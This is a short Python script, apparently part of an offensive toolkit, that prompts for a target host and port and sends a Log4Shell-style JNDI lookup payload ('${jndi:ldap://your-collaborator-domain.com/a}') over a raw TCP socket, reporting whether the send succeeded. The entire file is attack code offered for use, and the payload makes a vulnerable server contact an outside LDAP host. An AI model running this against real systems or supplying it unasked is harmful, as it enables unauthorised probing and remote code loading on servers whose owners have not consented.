import socket
from colorama import Fore

def run():
    target = input(f"\n{Fore.WHITE}[+] Enter target (IP/Domain): ")
    port = int(input("[+] Enter port: "))
    
    payload = "${jndi:ldap://your-collaborator-domain.com/a}"
    
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((target, port))
            s.sendall(payload.encode())
            print(f"{Fore.GREEN}[+] Payload sent to {target}:{port}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}")